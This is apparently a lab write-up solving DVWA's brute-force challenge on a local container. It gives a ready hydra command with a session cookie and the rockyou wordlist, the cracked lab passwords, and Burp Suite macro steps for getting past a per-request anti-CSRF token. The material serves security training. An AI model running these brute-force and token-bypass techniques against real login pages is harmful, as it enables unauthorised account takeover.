# Brute Force

Objective

Your goal is to get the administrator’s password by brute forcing. Bonus points
for getting the other four user passwords!

**I'd highly recommend finishing the SQL injection challenge first.**

## low

It's troublesome to crack both username and password together.   
From the SQL injection challenge we've already known there're four other users 
alongside Mr. admin:  
**gordonb, 1337, pablo, smithy**

Before we start brute-forcing with hydra, here's another problem:  
We've already been tested once when we log into DVWA's site, so any 
request in this level comes with some auth info, e.g. a cookie.
We'll be redirected to the login page `/login.php` upon failure.

First let's check the format of our request through burpsuite:  
```
GET /vulnerabilities/brute/?username=123&password=123&Login=Login
Cookie: PHPSESSID=otvfpg95r3p6qf24v9dsaru6s2; security=low
```

Go back to the webpage and we can see the failure prompt
`Username and/or password incorrect.`.

So our hydra command should look like this:
(my DVWA container at port 9999)  
```sh
#!/bin/sh
PHPSESSID="otvfpg95r3p6qf24v9dsaru6s2"
SECURITY="low"
USER_LST="./Brute_Force.users"
PASSWD_LST="/usr/share/wordlists/rockyou.txt"
hydra -s 9999 -L $USER_LST -P $PASSWD_LST localhost http-get-form \
"/vulnerabilities/brute/\
:username=^USER^&password=^PASS^&Login=Login\
:H=Cookie\: PHPSESSID=$PHPSESSID; security=$SECURITY\
:F=Username and/or password incorrect."
```

After some time we get all five passwords:
```
[9999][http-get-form] host: localhost   login: admin   password: password
[9999][http-get-form] host: localhost   login: gordonb   password: abc123
[9999][http-get-form] host: localhost   login: 1337   password: charley
[9999][http-get-form] host: localhost   login: pablo   password: letmein
[9999][http-get-form] host: localhost   login: smithy   password: password
```

user|password
-|-
admin|password
gordonb|abc123
1337|charley
pablo|letmein
smithy|password

## medium

In this level any failed attempt will be suspended for 2 seconds, which, only
delays us a little bit and we can even speed up our task by setting hydra's 
wait time to 1 second (-w 1).

## high

This level requires a third param called 'user_token'. If you have no idea what
it is, refer to "CSRF.md" for more infomation.

In order to bypass it, we need to do an extra step before making the login 
request. Hydra won't help us this time, but thankfully we have burpsuite's
intruder.

We can define session handling rules to make burpsuite perform specific actions
before making requests. Select
`Settings->Sessions->Session handling rules->Add->Rule actions->Add->Run a marco->Add`
and burpsuite will ask us to add something for the marco.

The only thing we need is the user token. Refresh the page, then select the GET 
request we've just made in marco recorder.
Next, click `Configure item`. We add a new custom parameter called 'user_token'
and let its value be anything between `value='` and `'` from response.
Apply this session handling rule to scope
`http://localhost:9999/vulnerabilities/brute/`.

Select `Send to repeater` for a captured login request and you'll see 
'user_token' change each time we click the 'send' button.

However, this is not enough for intruder to work properly. The problem is that
intruder in its default uses multithread and new user tokens fetched by our
marco always render old ones useless. If the marco of another request is made
before the current one, you'd still be redirected as the old user token became
invalid.

Click `Resource pool->Create a new resource pool` and change maximum concurrent
requests to 1. It might cost us a little bit more time to get the result but
at least it works perfectly.
